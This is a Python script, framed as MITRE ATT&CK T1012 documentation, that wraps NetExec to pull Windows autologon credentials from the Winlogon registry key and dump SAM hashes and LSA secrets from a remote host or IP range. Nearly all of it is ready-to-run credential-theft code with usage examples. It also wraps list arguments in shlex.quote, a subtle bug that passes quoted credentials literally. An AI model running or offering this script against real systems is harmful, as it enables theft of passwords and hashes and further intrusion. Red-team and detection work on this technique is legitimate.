# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1012 - Query Registry
# Objective: Remotely query the registry to find sensitive information.
# This Python script acts as a wrapper for the NetExec (NXC) binary to
# query the registry for autologon credentials and dump SAM/LSA secrets.

#!/usr/bin/env python3

import sys
import subprocess
import shlex

def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='netexec'):
    """
    Executes a NetExec command to query the registry for autologon credentials
    and dump SAM/LSA secrets.

    Args:
        target (str): The target IP address or hostname/CIDR range.
        username (str): The username for authentication.
        password (str): The password for authentication.
        domain (str): The domain for authentication.
        protocol (str): The protocol to use (default is 'smb').
        nxc_path (str): The path to the NetExec executable (assumes it's in PATH).
    """
    print(f"[*] Starting registry query for autologon credentials on {target} using NetExec...")
    print(f"[*] Protocol: {protocol}, User: {username}, Domain: {domain}")
    print("-" * 70)

    # FIX: Use a raw string (r'...') for the registry key to prevent backslash issues.
    # We also use the -v flag to query for specific values, which is more direct.
    # We will run two separate commands for clarity and to avoid issues with
    # multiple -v flags in a single command.
    
    # --- Command 1: Query for DefaultUsername ---
    key_path = r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
    value_name = 'DefaultUsername'
    
    command_user = [
        nxc_path,
        protocol,
        target,
        '-u', shlex.quote(username),
        '-p', shlex.quote(password),
        '-d', shlex.quote(domain),
        '-M', 'reg-query',
        '-k', key_path,
        '-v', value_name
    ]

    # --- Command 2: Query for DefaultPassword ---
    value_pass = 'DefaultPassword'
    
    command_pass = [
        nxc_path,
        protocol,
        target,
        '-u', shlex.quote(username),
        '-p', shlex.quote(password),
        '-d', shlex.quote(domain),
        '-M', 'reg-query',
        '-k', key_path,
        '-v', value_pass
    ]

    # --- Command 3: Dump SAM and LSA secrets for additional context ---
    command_secrets = [
        nxc_path,
        protocol,
        target,
        '-u', shlex.quote(username),
        '-p', shlex.quote(password),
        '-d', shlex.quote(domain),
        '--sam',
        '--lsa'
    ]

    try:
        # Execute the commands sequentially
        print(f"[*] Querying for '{value_name}'...")
        result_user = subprocess.run(command_user, capture_output=True, text=True, check=False)
        print(result_user.stdout.strip())
        if result_user.stderr:
            print("[!] NXC Warning:", result_user.stderr.strip())
        print("-" * 70)

        print(f"[*] Querying for '{value_pass}'...")
        result_pass = subprocess.run(command_pass, capture_output=True, text=True, check=False)
        print(result_pass.stdout.strip())
        if result_pass.stderr:
            print("[!] NXC Warning:", result_pass.stderr.strip())
        print("-" * 70)

        print("[*] Dumping SAM hashes and LSA secrets for context...")
        result_secrets = subprocess.run(command_secrets, capture_output=True, text=True, check=False)
        print(result_secrets.stdout.strip())
        if result_secrets.stderr:
            print("[!] NXC Warning:", result_secrets.stderr.strip())
        print("-" * 70)

        # Check the return codes to determine success or failure.
        if result_user.returncode == 0 and result_pass.returncode == 0 and result_secrets.returncode == 0:
            print("[+] All NetExec commands completed successfully.")
        else:
            print("[-] One or more NetExec commands failed.")
            print(f"[-] Exit Codes -> User Query: {result_user.returncode}, Pass Query: {result_pass.returncode}, Secrets Dump: {result_secrets.returncode}")
            print("[-] This could be due to authentication failure, network issues, or permissions.")
            
        return 0 # Return 0 if script itself completes without crashing

    except FileNotFoundError:
        print(f"[-] Error: The NetExec executable '{nxc_path}' was not found.")
        print("[-] Please ensure NetExec is installed and in your system's PATH, or provide the full path.")
        return 1
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")
        return 1

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: ./T1012_nxc_query_fixed.py <target> <username> <password> <domain>")
        print("Example: ./T1012_nxc_query_fixed.py 192.168.1.100 user pass .")
        sys.exit(1)

    # Unpack arguments
    target_ip, user, passwd, dom = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    
    # Call the main function
    exit_code = run_nxc_query(target_ip, user, passwd, dom)
    sys.exit(exit_code)